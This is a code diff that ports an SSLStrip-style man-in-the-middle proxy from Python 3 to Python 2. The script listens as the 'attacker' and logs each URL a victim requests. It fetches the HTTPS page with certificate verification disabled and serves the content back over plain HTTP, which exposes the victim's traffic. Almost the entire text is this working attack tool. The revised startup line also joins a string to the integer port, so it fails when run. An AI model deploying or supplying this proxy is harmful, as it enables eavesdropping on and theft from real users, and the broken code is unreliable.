@@ -149,28 +149,42 @@
 #         threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()
 
 
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import requests
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import httplib
+import ssl
+import urlparse
 
 ATTACKER_IP = "0.0.0.0"
-ATTACKER_PORT = 8080  # Should match redirect target
+ATTACKER_PORT = 8080
 
 class SSLStripProxy(BaseHTTPRequestHandler):
     def do_GET(self):
-        host = self.headers.get('Host', '')
-        url = f"https://{host}{self.path}"
-        print(f"[+] Victim requested: {url}")
+        host = self.headers.getheader('Host', '')
+        url = "https://{}{}".format(host, self.path)
+        print ("[+] Victim requested:" + url)
 
         try:
-            resp = requests.get(url, verify=False)
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
+            # Parse URL manually
+            parsed = urlparse.urlparse(url)
+            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
+
+            # Forward the original path and headers (basic)
+            conn.request("GET", parsed.path + ("?" + parsed.query if parsed.query else ""), headers=self.headers.dict)
+
+            # Get response
+            resp = conn.getresponse()
+            content = resp.read()
+
+            # Send back to victim
+            self.send_response(resp.status)
+            self.send_header("Content-type", resp.getheader('Content-Type', 'text/html'))
             self.end_headers()
-            self.wfile.write(resp.content)
+            self.wfile.write(content)
+
         except Exception as e:
-            self.send_error(502, f"SSLStrip failed: {e}")
+            self.send_error(502, "SSLStrip failed: {}".format(e))
 
 if __name__ == "__main__":
-    print(f"[*] Starting SSLStrip proxy on {ATTACKER_PORT}")
+    print ("[*] Starting SSLStrip proxy on port" + ATTACKER_PORT)
     httpd = HTTPServer((ATTACKER_IP, ATTACKER_PORT), SSLStripProxy)
     httpd.serve_forever()
